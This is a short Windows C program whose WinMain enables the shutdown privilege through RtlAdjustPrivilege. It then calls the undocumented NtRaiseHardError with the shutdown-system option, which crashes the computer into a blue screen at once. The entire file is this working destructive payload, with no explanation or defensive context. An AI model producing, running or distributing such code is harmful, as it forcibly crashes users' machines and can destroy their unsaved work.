#include "main.h"

int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrevInst, LPSTR strCmdLine, int nCmdShow) {
    BOOLEAN enabled;
    HARDERROR_RESPONSE response;
    RtlAdjustPrivilege(19, TRUE, FALSE, &enabled);
    NtRaiseHardError(0xc000022A, 0, 0, 0, OptionShutdownSystem, &response);
    return 0;
}